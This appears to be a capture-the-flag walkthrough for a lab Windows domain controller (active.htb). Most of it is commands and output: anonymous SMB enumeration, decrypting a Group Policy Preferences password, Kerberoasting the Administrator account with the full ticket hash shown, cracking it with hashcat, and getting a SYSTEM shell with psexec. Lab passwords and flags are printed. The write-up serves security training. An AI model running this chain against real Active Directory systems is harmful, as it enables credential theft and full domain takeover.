# SMB

Enumerate shares via null session:
```bash
smbclient -N -L \\\\10.129.1.240\\                                 
# Anonymous login successful

#         Sharename       Type      Comment
#         ---------       ----      -------
#         ADMIN$          Disk      Remote Admin
#         C$              Disk      Default share
#         IPC$            IPC       Remote IPC
#         NETLOGON        Disk      Logon server share 
#         Replication     Disk      
#         SYSVOL          Disk      Logon server share 
#         Users           Disk 
```

Spider all shares:
```bash
netexec smb 10.129.1.240 -u '' -p '' -M spider_plus
# /home/kali/.nxc/modules/nxc_spider_plus/10.129.1.240.json
```
Results:
```json
{
  "Replication": {
    "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
      "atime_epoch": "2018-07-21 12:37:44",
      "ctime_epoch": "2018-07-21 12:37:44",
      "mtime_epoch": "2018-07-21 12:38:11",
      "size": "23 B"
    },
    "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI": {
      "atime_epoch": "2018-07-21 12:37:44",
      "ctime_epoch": "2018-07-21 12:37:44",
      "mtime_epoch": "2018-07-21 12:38:11",
      "size": "119 B"
    },
    "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
      "atime_epoch": "2018-07-21 12:37:44",
      "ctime_epoch": "2018-07-21 12:37:44",
      "mtime_epoch": "2018-07-21 12:38:11",
      "size": "1.07 KB"
    },
    "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml": {
      "atime_epoch": "2018-07-21 12:37:44",
      "ctime_epoch": "2018-07-21 12:37:44",
      "mtime_epoch": "2018-07-21 12:38:11",
      "size": "533 B"
    },
    "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
      "atime_epoch": "2018-07-21 12:37:44",
      "ctime_epoch": "2018-07-21 12:37:44",
      "mtime_epoch": "2018-07-21 12:38:11",
      "size": "2.72 KB"
    },
    "active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
      "atime_epoch": "2018-07-21 12:37:44",
      "ctime_epoch": "2018-07-21 12:37:44",
      "mtime_epoch": "2018-07-21 12:38:11",
      "size": "22 B"
    },
    "active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
      "atime_epoch": "2018-07-21 12:37:44",
      "ctime_epoch": "2018-07-21 12:37:44",
      "mtime_epoch": "2018-07-21 12:38:11",
      "size": "3.63 KB"
    }
  }
}
```

Download files:
```bash
netexec smb 10.129.1.240 -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=200000
```

# GPP

The Groups.xml file contains a cpassword:
```xml
cat MACHINE/Preferences/Groups/Groups.xml 

<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
=> Creds:
`name="active.htb\SVC_TGS"`
`cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"`

Decrypt cpassword:
```bash
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
# GPPstillStandingStrong2k18
```

## LDAP user enum

```bash
netexec ldap 10.129.1.240 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' --users      

# LDAP        10.129.1.240    389    DC               [*] Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb)
# LDAP        10.129.1.240    389    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
# LDAP        10.129.1.240    389    DC               [*] Enumerated 4 domain users: active.htb
# LDAP        10.129.1.240    389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
# LDAP        10.129.1.240    389    DC               Administrator                 2018-07-18 21:06:40 0        Built-in account for administering the computer/domain      
# LDAP        10.129.1.240    389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain    
# LDAP        10.129.1.240    389    DC               krbtgt                        2018-07-18 20:50:36 0        Key Distribution Center Service Account                     
# LDAP        10.129.1.240    389    DC               SVC_TGS                       2018-07-18 22:14:38 0
```

# Kerberoasting

```bash
impacket-GetUserSPNs -request 'active.htb/SVC_TGS':'GPPstillStandingStrong2k18' -dc-ip 10.129.1.240

# Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

# ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
# active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2025-12-03 09:36:39.858938             



# [-] CCache file is not found. Skipping...
# $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d3572fd1be517f90d99d779fda98714e$05cba13c5966a2c7b37c295af3021a33ec6a18441d4600d032d6ab509340c55fb3f734eddf0df398f6171893079cf5d00c28d0c071246b457f4ea96ec69bd2df589540e0214d30c2b50fbbe1d16a2ee1328e596bce51102dea4d2c2bdc36f11d7695b79bebad9e5dff4aa0e4a0018a11db327781e88bd677949fd60abc6d89784c4c64847f636315062c86700e08f207c41268a1e816d68d138ead11dc70120850bdc1ab90bbad3369328082a6cd81c5717a89e7c3e182d31f857d566fc58eb4cf11cba74639fa8af432f79711193246629762350687faaf9f6563b4980d6d9d7c92410a7e08193c5bab00e10ae8e37e9da84fcf43ddde48c5ab70a9e94dd82a99739a2f51b7bfea19337b64fedeea2465fcd3ff73986667d848fdb1476e347cf60ee1420c3d3d04daa3c99c6dc8dce73657163dee6bcf3ea6e322bef083d68b3fa68093d2ce24e09a4f4482d3b7482a1ea40ce292e64ccd98d40533a897475fcff5e7605ad9f60a08027b681c437f8bf8f720341eee1fa4176a59610bfd1fe738a748a2d02e48189644d186b6625dae81c6815794a34ddb97fbd482d4c2a83721862bb0de40a14acd2234219018dc9919be6602060efd27d75116e9a8927a2adef2f50b6765b3a7b258725cc741d015d68da8ab4c3f7a6cac622ea0dc2126ac1d980acce8fb45e1b8c8e35bf1c15ff814211c8206c5c4e19a9d72db481cb258a77c6c3451862d8d736cb2439801a6df0056fb9fcd11a9c652ce8bb17b85de6e1c5226790b6a2aa1b8e41dfb47a6d9f97747a57c5c417b935fd146a191ca768592624ff662893c8acf454996bad0ac30a742c88fc015738288fea1f4063d874f65ab891d78a16cf2b3d14bd66957802a953bafa0af27574f21336d3f31433bc3a5d337a6a5f8c4b4ac324dd8c6d0fe603939a1e716c75ac68bf9c4b994083f3a0afdba8c410797819a2c8adb0a304c325c5a3916968dc53b62fcb77d5d482a829277777e94188d4e185c84fab5f96e240bc6b5b34bea61f2af4e62a8349fdc000db5641ebc821fc2881a2d20491c45fd57f7f12bdb27e3fbfe2a1d06ae7a242cb2ce4166bdccae81b88c1c8dceb875a3833f3d027dbcec8b51a2ef238aa7918dac85a377d3cbc2d78be885ccff8219b018a09549ce692b73e53c48590ed47f36929e881131c2d8dba93233737e6e07d9de05c8503cc9fc66315aedf5b7cfb2927400f8236941cd249aaffc85681ddc09228718a5d04f2ecc1514
```

## Hash Cracking

```bash
hashcat -m 13100 administrator.hash /usr/share/wordlists/rockyou.txt
```
=> `Ticketmaster1968`

# Shell as NT System

```bash
impacket-psexec 'active.htb/Administrator':'Ticketmaster1968'@10.129.1.240
```
BINGO!

# Flags

User:
```cmd
type "C:\Users\SVC_TGS\Desktop\user.txt"
03491afabb30d4efffeedd1f2fe0fd2c
```

Root:
```
type "C:\Users\Administrator\Desktop\root.txt"
b4afad6a733570ab58e405cda8e9d846
```

---
# Alternative way for user flag

```bash
smbclient \\\\10.129.1.240\\Users -U 'active.htb\SVC_TGS'%'GPPstillStandingStrong2k18'

ls
#  .                                  DR        0  Sat Jul 21 16:39:20 2018
#  ..                                 DR        0  Sat Jul 21 16:39:20 2018
#  Administrator                       D        0  Mon Jul 16 12:14:21 2018
#  All Users                       DHSrn        0  Tue Jul 14 07:06:44 2009
#  Default                           DHR        0  Tue Jul 14 08:38:21 2009
#  Default User                    DHSrn        0  Tue Jul 14 07:06:44 2009
#  desktop.ini                       AHS      174  Tue Jul 14 06:57:55 2009
#  Public                             DR        0  Tue Jul 14 06:57:55 2009
#  SVC_TGS

cd SVC_TGS
cd Desktop
get user.txt
```